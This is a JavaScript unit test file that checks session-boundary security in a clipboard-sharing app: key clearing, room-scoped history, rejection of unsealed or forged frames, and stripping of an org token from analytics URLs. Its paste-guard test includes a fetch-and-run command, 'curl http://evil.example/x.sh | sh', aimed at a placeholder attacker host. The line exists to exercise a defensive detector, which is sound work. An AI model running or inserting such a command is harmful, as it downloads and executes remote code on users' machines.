/**
 * Session boundaries and frame authenticity.
 *
 * Every check here stands for a bug that shipped, and they share one shape:
 * something that belonged to ONE session — a key, a room's history, a queued
 * clip, a frame — outlived it or reached across into another. None of it was
 * covered, because none of it is visible from the surfaces the other suites
 * drive.
 *
 * Usage: node tests/unit/session-boundaries.mjs
 */

import { pathToFileURL } from "node:url";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const REPO = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const load = p => import(pathToFileURL(join(REPO, p)).href);

let pass = 0, fail = 0;
const ok = (name, good, detail = "") => {
  good ? pass++ : fail++;
  console.log(`  ${good ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
};

// sessionStorage, or history.js and storage.js degrade to memory and half of
// this passes for the wrong reason.
const store = new Map();
globalThis.sessionStorage = {
  getItem: k => (store.has(k) ? store.get(k) : null),
  setItem: (k, v) => store.set(k, String(v)),
  removeItem: k => store.delete(k),
};

const { readFile } = await import("node:fs/promises");
const readFileText = p => readFile(join(REPO, p), "utf8");
const readMain = () => readFileText("src/main.js");

const state   = await load("src/core/state.js");
const history = await load("src/core/history.js");
const crypto_ = await load("src/core/crypto.js");
const frames  = await load("src/core/frames.js");
const guard   = await load("src/clipboard/guard.js");
const bus     = await load("src/core/bus.js");

/* ---------------------------------------------------------- credentials --- */
console.log("\nClearing a session actually clears it\n");

await (async () => {
  const { aesKey, roomHash } = await crypto_.deriveOpen("D75LVX9QRS");
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey });
  ok("a session has a key to begin with", state.get().aesKey !== null);

  // The VS Code leave path says exactly this, and `??` read the explicit null
  // as "leave it alone" — so the one credential that mattered survived.
  state.setKey({ key: "", roomHash: "", aesKey: null });
  ok("an explicit null CLEARS the AES key", state.get().aesKey === null,
     "`aesKey ?? state.aesKey` kept the key of the room being left");

  state.setKey({ key: "X", roomHash: "rh", aesKey: "sentinel" });
  state.setKey({ key: "Y" });
  ok("...while an OMITTED property still leaves it alone",
     state.get().aesKey === "sentinel" && state.get().roomHash === "rh");

  state.clearKey();
  const s = state.get();
  ok("clearKey() leaves no credential behind",
     !s.key && !s.roomHash && s.aesKey === null && s.authToken === null && s.locked === false);
})();

/* -------------------------------------------------------------- history --- */
console.log("\nHistory belongs to a ROOM, not to a share key\n");

history.init();
state.setKey({ key: "D75LVX9QRS", roomHash: "roomOPEN", aesKey: null });
history.add({ text: "in the open room", direction: "received" });
ok("a clip is recorded", history.size() === 1);

// Re-PINning keeps the key and changes the room. Scoped to the key, history
// followed the user across that change — as it did for a WRONG-PIN join, which
// lands in a different room under the very same key.
state.setKey({ key: "D75LVX9QRS", roomHash: "roomLOCKED", aesKey: null });
ok("re-PINning the SAME key clears it", history.size() === 0,
   "same key, different room — the room is the privacy boundary");

history.add({ text: "in the locked room", direction: "received" });
state.setKey({ key: "D75LVX9QRS", roomHash: "roomLOCKED", aesKey: null });
ok("...but re-entering the same room keeps it", history.size() === 1);

/* ------------------------------------------------------- sealed frames --- */
console.log("\nA frame with no envelope is not a frame we trust\n");

await (async () => {
  const { aesKey, roomHash } = await crypto_.deriveOpen("D75LVX9QRS");
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey });
  frames.setPlaintextFrames(["file-req", "file-gone"]);

  const sealed = await frames.encryptFrame({
    t: "rtc-offer", id: "f1", to: "peerB", from: "peerA", sdp: "v=0 SECRET",
  });
  ok("sealing leaves the routing readable",
     sealed.t === "rtc-offer" && sealed.to === "peerB" && sealed.from === "peerA");
  ok("...and the payload unreadable", !("sdp" in sealed) && Boolean(sealed.payload));

  const opened = await frames.decryptFrame(sealed);
  ok("...and it round-trips", opened.sdp === "v=0 SECRET" && opened.t === "rtc-offer");

  // The injection this prevents: a relay cannot produce a payload, so it sends
  // the frame in the clear and hopes nobody checks.
  ok("an unsealed rtc-offer is DROPPED",
     await frames.decryptFrame({ t: "rtc-offer", id: "f1", sdp: "v=0 INJECTED" }) === null,
     "a relay could otherwise inject negotiation into a session it has no key for");
  ok("an unsealed stream is dropped too",
     await frames.decryptFrame({ t: "stream", text: "typed by the relay" }) === null);
  ok("an unsealed file-meta is dropped too",
     await frames.decryptFrame({ t: "file-meta", id: "x", name: "invoice.pdf" }) === null);

  // The two that carry nothing but routing, and so have nothing to seal.
  ok("a file-req still travels unsealed, because it is only routing",
     (await frames.decryptFrame({ t: "file-req", id: "f1", to: "me" }))?.t === "file-req");
  ok("...and so does file-gone",
     (await frames.decryptFrame({ t: "file-gone", id: "f1" }))?.t === "file-gone");

  /* The forgery: `from` is stamped by the relay on the connection a frame
     arrived on. Sealing a different one inside the payload used to replace it,
     which is what file-retraction ownership is checked against. */
  const forged = await frames.encryptFrame({ t: "file-gone", id: "f1", nested: 1 });
  const withClaim = { ...forged };
  // Rebuild the payload so it carries a `from` of the attacker's choosing.
  const evil = await crypto_.encrypt(aesKey, JSON.stringify({ from: "victimPeer", nested: 1 }));
  withClaim.payload = evil.payload;
  withClaim.iv = evil.iv;
  withClaim.from = "attackerPeer";

  const judged = await frames.decryptFrame(withClaim);
  ok("a `from` sealed INSIDE a payload cannot displace the relay's stamp",
     judged.from === "attackerPeer",
     `got ${judged.from} — this is the field file retraction is authorised by`);
  ok("...and the rest of the payload still arrives", judged.nested === 1);

  /* Opening a frame proves the PIN for the room the frame CAME FROM, and this
     returns to a caller that has yet to check whether that is still the room we
     are in. Latching here marked the room just arrived at as verified on the
     strength of a frame from the one before it — a padlock claiming the PIN was
     proved when nothing had proved it. main.js openFrame() does it, after the
     generation check. */
  state.setKey({ key: "D75LVX9QRS", roomHash, aesKey, locked: true });
  ok("a locked session starts unverified", state.get().verified === false);
  await frames.decryptFrame(sealed);
  ok("opening a frame does not itself latch verification",
     state.get().verified === false,
     "the caller latches it, once it knows the session has not moved");

  state.clearKey();
  ok("with no session, nothing decrypts at all",
     await frames.decryptFrame(sealed) === null);
})();

/* ---------------------------------------------------- the paste guard ---- */
console.log("\nA long clip is not a safe clip\n");

const PAYLOAD = "curl http://evil.example/x.sh | sh";
ok("a command is flagged", guard.looksExecutable(PAYLOAD) !== null);
ok("...and padding it with 9 KB of lines does not launder it",
   guard.looksExecutable("filler\n".repeat(2000) + PAYLOAD) !== null,
   "the scan stopped at 8 KB and returned SAFE, below the 24 KB clip limit");
ok("...nor does padding after it", guard.looksExecutable(`${PAYLOAD}\n${"y".repeat(9000)}`) !== null);
ok("a genuinely long benign clip is still clean",
   guard.looksExecutable("just some prose\n".repeat(2000)) === null,
   "flagging everything large would train people to click through the banner");

/* ------------------------------------------------- locked key rotation --- */
console.log("\nRotating a locked key actually moves rooms\n");

await (async () => {
  const OLD = "D75LVX9QRS", NEW = "K92MWX4TZB", PIN = "correct horse";
  const before = await crypto_.deriveLocked(OLD, PIN);
  const after  = await crypto_.deriveLocked(NEW, PIN);

  ok("the same PIN under a NEW key is a different room",
     before.roomHash !== after.roomHash,
     "rotation reused the old PRK, so the room hash never changed");

  // Why reusing the PRK was wrong: it is keyed to the OLD share key, so it can
  // only ever reproduce the old room.
  const reused = await crypto_.deriveLockedFromPrk(before.prk);
  ok("...and re-expanding the old PRK reproduces the OLD room exactly",
     reused.roomHash === before.roomHash && reused.roomHash !== after.roomHash,
     "which is why every device holding the old link stayed in");
  ok("the admission token moves with it", before.authToken !== after.authToken);
})();

/* ------------------------------- what leaving invalidates, structurally --- */
/* main.js is the composition root and cannot be imported under node — it pulls
   in the DOM. These read it, because the property under test is WHERE a rule
   sits: every one of these bugs was a correct check placed in a caller instead
   of in the one function every room change goes through.

   Read by BRACE MATCHING, not by regex. The first version of these checks was
   /function leaveRoom\(\)[^]*?sessionGen\+\+/ — `[^]*?` crosses function
   boundaries, so it matched `sessionGen++` anywhere later in the file and every
   check passed against the code it was written to reject. */
console.log("\nLeaving a room invalidates everything that belonged to it\n");

const MAIN = await readMain();

/**
 * A body with its comments removed.
 *
 * Every rule under test is also DESCRIBED in a comment beside it, so a check
 * for the rule matches the prose whether or not the code is there — and an
 * ordering check matches the first MENTION, which for leaveRoom() is the
 * sentence explaining why the key is read before it. Assert on code.
 */
const codeOnly = body => (body ?? "")
  .replace(/\/\*[^]*?\*\//g, "")
  .replace(/(^|[^:])\/\/.*$/gm, "$1");

/**
 * The body of one function, brace-matched. Null if it is not there.
 *
 * The opening brace is the one after `=>` or `)`, never simply the next `{`:
 * `async ({ key, locked }) => {` opens a DESTRUCTURED PARAMETER first, and
 * taking that one returns the parameter list as though it were the function —
 * which reads as "the rule is not there" for every rule.
 */
function bodyOf(src, signature) {
  const at = src.indexOf(signature);
  if (at === -1) return null;
  const brace = /(?:=>|\))\s*\{/g;
  brace.lastIndex = at;
  const hit = brace.exec(src);
  if (!hit) return null;
  const open = hit.index + hit[0].length - 1;
  let depth = 0;
  for (let i = open; i < src.length; i++) {
    if (src[i] === "{") depth++;
    else if (src[i] === "}" && --depth === 0) return src.slice(open, i + 1);
  }
  return null;
}

const leave = codeOnly(bodyOf(MAIN, "function leaveRoom()"));
const evicted = codeOnly(bodyOf(MAIN, "async function onEvicted()"));
const evict = codeOnly(bodyOf(MAIN, "async function sendEviction()"));

/* The reader has to be trustworthy before anything it reads is worth checking.
   endSession() is the next function after leaveRoom(); if the match ran past
   the closing brace it would swallow endSession() whole and every assertion
   below would pass for the wrong reason. */
ok("the function reader finds leaveRoom at all", leave.length > 0);
ok("...and stops at its own closing brace", !leave.includes("history.clear"),
   "endSession() follows it — capturing that would make every check below vacuous");
ok("...and the same for the control sender",
   evict.length > 0 && !evict.includes("async function"),
   "one function, not everything from here to the end of the file");
ok("...and comments are not mistaken for code", !leave.includes("belonged to the room"),
   "every rule here is also described in prose beside it");
ok("...and a destructured parameter list is not mistaken for a body",
   [leave, evicted, evict].every(b => b.includes(";")),
   "`async ({ key }) => {` opens a parameter first, and taking that brace reads "
   + "as 'the rule is missing' for every rule in the function");

ok("leaveRoom() invalidates the generation itself", leave.includes("sessionGen++"),
   "several callers then sit on a modal — an eviction notice, a PIN prompt — "
   + "and for that whole dialog the old generation still matched");
ok("...and clears the key with it", leave.includes("state.clearKey()"));
ok("...and drops the clip waiting for a click", leave.includes("capture.forgetSession()"));
ok("...and the queued clip", leave.includes("queuedClip = null"));
ok("...and stops the files layer", leave.includes("filesTeardown()"));
ok("...and abandons any proof still being sealed",
   leave.includes("verifier.cancel()"),
   "a proof sealed for this room is undecryptable noise in the next one");

ok("eviction is a full teardown, not a subset of one",
   evicted.includes("endSession()"),
   "being removed from a session is an involuntary leave");
ok("...and does not hand-roll a partial one",
   !evicted.includes("storage.forgetLastKey()"),
   "the partial version is what left the generation and the key alive");

/* leaveRoom() clears the key, so the one path that REUSES it has to read it
   first. This is scoped to the handler, not the file. */
const repin = codeOnly(bodyOf(MAIN, 'on("session:repin"'));
ok("re-PIN reads the key before leaving",
   repin.includes("state.get().key") && repin.includes("leaveRoom()")
   && repin.indexOf("state.get().key") < repin.indexOf("leaveRoom()"),
   "otherwise it reopens with an empty key");

const rejoin = codeOnly(bodyOf(MAIN, 'on("session:rejoin"'));
ok("rejoin asks for its PIN before leaving",
   rejoin.includes("lockDialog.ask") && rejoin.includes("leaveRoom()")
   && rejoin.indexOf("lockDialog.ask") < rejoin.indexOf("leaveRoom()"),
   "leaving first meant backing out dropped the user into no session at all");

console.log("\nOff means nothing leaves — the control clips included\n");

ok("the eviction is gated on the rung", evict.includes("sharesSession"),
   "it goes out as a clip and takes the room's one retained slot");
ok("...and re-checked after its encryption",
   (evict.match(/sharesSession/g) ?? []).length >= 2);
ok("...and reports whether the goodbye actually went",
   evict.includes("return true;") && evict.includes("return false;"),
   "an Off device leaves the others connected to nothing; that must be said, not hidden");

const lock = codeOnly(bodyOf(MAIN, 'on("session:lock"'));
ok("...and the lock toast says so when it did not",
   /not told/.test(lock),
   "silence here is the failure sendEviction() exists to prevent");

console.log("\nProving a locked room costs the room nothing\n");

/* The rules live in core/verify.js and are exercised by running it —
   tests/unit/verify.mjs. What can only be checked HERE is the wiring: that the
   proof is no longer a clip, and that every moment the answer could change is
   actually connected to something. */
ok("THE COMPETITION IS GONE: nothing seals the beacon sentinel any more",
   !/encrypt\([^)]*LOCK\.BEACON/.test(MAIN) && !MAIN.includes("sendBeacon"),
   "it took the room's one retained clip, so proving a PIN destroyed the replay");
ok("...but an older client's beacon is still recognised on arrival",
   MAIN.includes("text === LOCK.BEACON"),
   "unfiltered, the sentinel reaches the editor, the clipboard and history");

ok("joining asks the room to prove itself",
   /on\(EV\.ROOM_STATE, \(\) => verifier\.request\(\)\)/.test(MAIN));
ok("...and so does a peer arriving",
   /on\(EV\.PEERS_CHANGED, \(\) => verifier\.request\(\)\)/.test(MAIN),
   "you open the link first and the other device follows a minute later");

/* The trigger that closes the trapdoor. A device that was Off answered nothing,
   and the peer that asked has no reason to ask again — its trigger was an
   arrival, and nobody else is going to arrive. */
const rung = codeOnly(bodyOf(MAIN, "on(EV.SETTINGS_CHANGED, ({ name, value })"));
ok("coming off Off asks again", rung.includes("verifier.request()"));
ok("...AND answers unprompted", rung.includes("verifier.announce()"),
   "asking alone leaves the peer that gave up waiting for ever");
ok("...and only for the rung, only upwards",
   /name !== "syncMode" \|\| !sharesSession\(value\)/.test(rung));

/* Inbound, the proof is above the rung gate for the same reason the lock
   sentinels are: the rung governs what reaches the USER, not what the session
   knows about itself. */
/* Sliced, not brace-matched: bodyOf() looks for the `) {` of a function and a
   `case` label has neither, so it would silently return some later block and
   assert against the wrong code. Bounded by the `default:` that follows. */
const caseAt = MAIN.indexOf("case proto.T.VERIFY:");
const defaultAt = MAIN.indexOf("default:", caseAt);
const inbound = caseAt < 0 || defaultAt < 0 ? "" : codeOnly(MAIN.slice(caseAt, defaultAt));
ok("the case reader found the branch and stopped at the next one",
   inbound.includes("proto.T.VERIFY") && !inbound.includes("cursors.FRAMES"),
   "running on into `default:` would make the check below vacuous");
ok("an Off device still opens a proof it is sent",
   inbound.includes("openFrame(msg, gen)") && !inbound.includes("sharesSession"),
   "it is entitled to know its own PIN is right; verify.js stops the reply");

const BANNERS = codeOnly(await readFileText("src/ui/shell/banners.js"));
ok("the doubt banner does not claim solitude while a peer is present",
   /s\.peers > 1\) return;/.test(BANNERS),
   "another device in a LOCKED room derived the same PIN to get there");
ok("...and does not outlive the solitude it claimed",
   /on\(EV\.PEERS_CHANGED, \(\{ count \}\) => \{[^]*?dismiss\("lock"\)/.test(BANNERS),
   "the check ran once, on a timer; a device arriving a second later left the "
   + "warning up beside a roster listing them");
ok("...and a relay too old to be asked is told apart from a wrong PIN",
   BANNERS.includes('relayCaps') && /cannot confirm the PIN/.test(BANNERS),
   "otherwise it sends someone to re-type a PIN that was right the first time");

/* ------------------------------------------ the deployment credential --- */
console.log("\nThe org token is a credential, not a room name\n");

await (async () => {
  // config.js reads location at module scope, so this needs its own realm.
  globalThis.location = {
    origin: "https://relay.example", pathname: "/app",
    search: "?org=SUPERSECRET&relay=wss%3A%2F%2Fr.example", hostname: "relay.example",
  };
  const cfg = await import(
    `${pathToFileURL(join(REPO, "src/core/config.js")).href}?org-test`);

  ok("the token is still resolved, so the device can be admitted",
     cfg.ORG_TOKEN === "SUPERSECRET");
  ok("...but page_location does not carry it",
     !cfg.pageLocation().includes("SUPERSECRET"),
     `${cfg.pageLocation()} — gtag sends this verbatim, and AdSense reads the URL itself`);
  ok("...while the rest of the query survives",
     cfg.pageLocation().includes("relay="),
     "a relay hostname is not a secret and is worth keeping for attribution");
  ok("safeSearch drops only the credential",
     cfg.safeSearch("?a=1&org=X&b=2") === "?a=1&b=2", cfg.safeSearch("?a=1&org=X&b=2"));
  ok("a query that was ONLY the credential becomes no query at all",
     cfg.safeSearch("?org=X") === "", `"${cfg.safeSearch("?org=X")}"`);
  ok("...and a query without one is left exactly alone",
     cfg.safeSearch("?a=1&b=2") === "?a=1&b=2");
  ok("no argument means this page's own query, stripped",
     cfg.safeSearch() === "?relay=wss%3A%2F%2Fr.example", cfg.safeSearch());
  delete globalThis.location;
})();

console.log(`\n${"=".repeat(58)}`);
console.log(`SESSION BOUNDARIES: ${pass}/${pass + fail} passed`);
console.log("=".repeat(58));
process.exit(fail ? 1 : 0);
